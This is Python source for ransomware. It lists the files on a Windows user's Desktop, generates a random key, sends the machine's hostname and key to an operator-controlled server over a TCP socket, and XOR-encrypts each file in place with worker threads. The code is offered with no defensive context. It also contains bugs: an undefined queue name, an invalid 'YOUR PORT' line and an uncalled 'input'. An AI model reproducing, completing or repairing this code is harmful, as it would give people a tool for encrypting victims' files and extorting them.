import socket
import os
import threading
import queue
import random


##Ecryption function that threads will run
def encrypt(key):
    while True:
        file = g.get()
        print(f"Encrypting {file}")
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                # increment key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f"{file} encrypted successfully")
        except:
            print("Failed to encrypt file :(")
        g.task_done()

# socket information
IP_address = 'YOUR IP'
PORT = YOUR PORT

# Encryption Information

ENCRYPTION_LEVEL  = 512 // 8 # 512 bits = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`-=[]{}|;:,.<>?'
key_char_pool_len = len(key_char_pool)

#Grab filepaths to encrypt
print("Preparing to encrypt files...")
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("Successfully located files")

#Grab client's hostname
hostname = os.getenv('COMPUTERNAME')

#Generate encryption key
print("Generating encryption key...")
key = ''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len - 1)]
print("Key generated successfully")

# Connect to server to transfer key and hostname
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_address, PORT))
    print("Connected to server... transmitting hostname and key")
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print("Finished Transmitting Data")
    s.close()

# Store files into queue for threads to handle
q = queue.Queue()
for file in abs_files:
    q.put(file)

#Setup threads to get ready for encryption
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print("All files encrypted successfully")
input

        

                
